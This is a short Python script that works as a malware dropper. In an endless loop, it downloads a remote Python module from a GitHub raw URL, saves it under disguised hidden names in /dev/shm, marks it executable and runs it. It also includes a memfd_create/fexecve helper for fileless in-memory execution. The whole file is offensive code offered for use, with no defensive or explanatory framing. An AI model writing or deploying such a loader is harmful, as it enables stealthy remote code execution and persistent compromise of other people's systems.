import os, time, subprocess, urllib.request, ctypes

URL = "https://raw.githubusercontent.com/mimikr00t/superecon/refs/heads/main/modules/core.py"
LOC = ["/dev/shm/.cache1", "/dev/shm/.cache2"]

def mem_exec(payload):
    libc = ctypes.CDLL(None)
    fd = libc.memfd_create(b"memfile", 1)
    os.write(fd, payload)
    os.fexecve(fd, [b"python3"], os.environ)

def fetch_and_run():
    for path in LOC:
        if not os.path.exists(path):
            data = urllib.request.urlopen(URL).read()
            with open(path, "wb") as f: f.write(data)
            os.chmod(path, 0o700)
        proc = subprocess.Popen(["python3", path])
        time.sleep(1)

while True:
    fetch_and_run()
    time.sleep(10)

